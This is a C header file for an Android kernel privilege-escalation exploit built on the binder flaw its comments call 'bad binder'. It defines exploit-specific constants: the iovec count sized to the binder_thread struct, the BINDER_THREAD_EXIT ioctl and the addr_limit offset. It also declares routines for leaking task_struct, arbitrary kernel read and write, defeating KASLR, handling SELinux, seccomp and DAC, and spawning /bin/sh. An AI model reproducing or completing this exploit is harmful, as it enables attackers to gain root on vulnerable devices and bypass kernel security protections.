#define _GNU_SOURCE

#include <sys/fcntl.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/uio.h>
#include <errno.h>
#include <sys/mman.h>
#include <string.h>
#include <sys/types.h>
#include <android/log.h>
#include <unistd.h>
#include <sys/socket.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <sys/wait.h>
#include <sched.h>
#include <stdbool.h>
#include <sys/user.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <sepol/policydb/policydb.h>
#include <sepol/policydb/services.h>
#include <sys/time.h>

#include "kernel_specific.h"
#include "kernel_rw.h"
#include "dac.h"
#include "seccomp.h"
#include "selinux.h"

// number of iovec struct to be reach 400 bytes (25 * 16), struct binder_thread is 408 bytes long
#define IOV_CNT 25
#define TASK_LIST_OFFSET 11
#define DELAY 100u // process need to wait his parent executes readv/writev/recvmsg before it resumes

// binder driver specific, don't change
#define BINDER_THREAD_EXIT 0x40046208ul
#define THREAD_SIZE (PAGE_SIZE << 2)
#define ADDR_LIMIT_OFFSET 8
#define SPINLOCK 0x10001 // value spinlock takes after unlinking

/**
 * Bind to core 0 to make exploit more reliable
 * https://cloudfuzz.github.io/android-kernel-exploitation
 * I actually only noticed unreliable behaviour (quite rare nonetheless) without this piece of code
 */
void bind_to_core();

/**
 * Use CVE bad binder to get task_struct pointer of current process
 * @return
 */
void *leak_task_struct();

/**
 * Use CVE bad binder to perform arbitrary write
 * @param addr
 * @param overwrite_array
 * @param overwrite_size
 * @return
 */
bool overwrite_addr(void *addr, unsigned long *overwrite_array, unsigned int overwrite_size);

/**
 * Use CVE to perform arbitrary read
 * @param addr
 * @param leak_array
 */
bool leak_addr(void *addr, unsigned long *leak_array);


/**
 * Check if an address is a kernel address
 * @param kaddr
 * @return
 */
bool is_valid_kaddr(unsigned long kaddr);

/**
 * Read thread_info from stack pointer in struct_task. Actually they're the same !
 * @param stack
 * @return
 */
unsigned long get_current_thread_info(unsigned long stack);

/**
 * Check if addr_limit has been overwritten with 0xff..fe
 * @param addr_limit_addr
 * @return true if overwrite succeed
 */
bool check_addr_limit(unsigned long addr_limit_addr);

/**
 * Deduce kaslr from a task_struct pointer. Actually the first one in task_struct whose address
 * has kaslr
 * @param task_struct_addr
 * @return
 */
unsigned long get_kaslr_offset(unsigned long task_struct_addr);

/**
 * /bin/sh
 */
void execute_sh();
